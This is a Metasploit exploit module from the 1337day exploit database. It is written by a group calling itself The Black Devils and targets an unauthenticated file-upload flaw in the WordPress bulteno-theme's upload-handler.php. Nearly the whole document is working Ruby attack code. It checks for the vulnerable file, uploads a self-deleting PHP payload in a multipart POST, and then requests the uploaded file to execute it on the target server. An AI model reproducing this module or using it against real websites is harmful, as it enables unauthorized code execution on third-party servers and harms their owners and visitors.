#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#
#     _                   __           __       __                     #
#   /' \            __  /'__`\        /\ \__  /'__`\                   #
#  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           #
#  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          #
#     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           #
#      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           #
#       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           #
#                  \ \____/ >> Exploit database separated by exploit   #
#                   \/___/          type (local, remote, DoS, etc.)    #
#                                                                      #
#  [+] Site            : 1337day.com                                   #
#  [+] Support e-mail  : submit[at]1337day.com                         #
#                                                                      #
#               #########################################              #
#               I'm The Black Devils member from Inj3ct0r Team         #
#               #########################################              #
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-#
##
# This Exploit must be use in Metasploit Framework
#   http://metasploit.com/framework/
# This module created by The Black Devils 1337day team
##
  
  
require 'msf/core'
require 'msf/core/exploit/php_exe'
  
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::PhpEXE
  
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'WordPress bulteno-theme Themes Remote File Upload Vulnerability',
            'Description'    => %q{
                    This module exploits a vulnerability found in Wp bulteno-theme By abusing the upload-handler.php file,
                 a malicious user can upload a file to a
                temp directory without authentication, which results in arbitrary code execution.
            },
            'Author'         =>
                [
                    'iskorpitx', # initial discovery
                    'The Black Devils', # Metasploit Module
                ],
            'License'        => MSF_LICENSE,
            'References'     =>
                [
                    [ '1337day', '21516' ],
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00",
                },
            'Platform'       => 'php',
            'Arch'           => ARCH_PHP,
            'Targets'        =>
                [
                    [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],
                    [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]
                ],
            'DefaultTarget'  => 0,
            'DisclosureDate' => 'Mar 26 2012'))
  
        register_options(
            [
                OptString.new('TARGETURI', [true, 'The full URI path to wordpress', '/wp'])
            ], self.class)
    end
  
    def check
        uri =  target_uri.path
        uri << '/' if uri[-1,1] != '/'
  
        res = send_request_cgi({
            'method' => 'GET',
            'uri'    => "#{uri}wp-content/themes/bulteno-theme/functions/upload-handler.php"
        })
  
        if not res or res.code != 200
            return Exploit::CheckCode::Unknown
        end
  
        return Exploit::CheckCode::Appears
    end
  
    def exploit
        uri =  target_uri.path
        uri << '/' if uri[-1,1] != '/'
  
        peer = "#{rhost}:#{rport}"
  
        @payload_name = "#{rand_text_alpha(5)}.php"
        php_payload = get_write_exec_payload(:unlink_self=>true)
  
        data = Rex::MIME::Message.new
        data.add_part(php_payload, "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"#{@payload_name}\"")
        data.add_part("#{uri}public/js/uploadify", nil, nil, "form-data; name=\"folder\"")
        post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')
  
        print_status("#{peer} - Uploading payload #{@payload_name}")
        res = send_request_cgi({
            'method' => 'POST',
            'uri'    => "#{uri}wp-content/themes/bulteno-theme/functions/upload-handler.php",
            'ctype'  => "multipart/form-data; boundary=#{data.bound}",
            'data'   => post_data
        })
  
        if not res or res.code != 200 or res.body !~ /#{@payload_name}/
            fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
        end
  
        upload_uri = res.body
  
        print_status("#{peer} - Executing payload #{@payload_name}")
        res = send_request_raw({
            'uri'    => upload_uri,
            'method' => 'GET'
        })
    end
end
